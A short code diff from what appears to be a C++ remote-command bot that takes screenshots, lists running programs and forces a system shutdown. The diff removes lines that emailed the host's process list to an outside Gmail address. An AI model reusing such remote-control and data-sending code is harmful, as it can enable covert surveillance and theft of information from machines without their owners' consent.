@@ -46,16 +46,6 @@ void execute_command(const string& command) {
     send_screenshot();
   }else if (trimmed_cmd.find("list_program") == 0) {
     list_programs();
-    Sleep(1000);
-    ifstream test_file("process_list.txt");
-    if (test_file.good()) {
-      test_file.close();
-      send_email_with_attachment(
-          "serverbottestmmt@gmail.com", "Running Process List",
-          "Attached is the current process list.", "process_list.txt");
-    } else {
-      cerr << "Failed to create process list file" << endl;
-    }
   } else if (trimmed_cmd.find("shutdown") == 0) {
     cout << "Initiating system shutdown..." << endl;
     if (system("shutdown /s /t 0") != 0) {
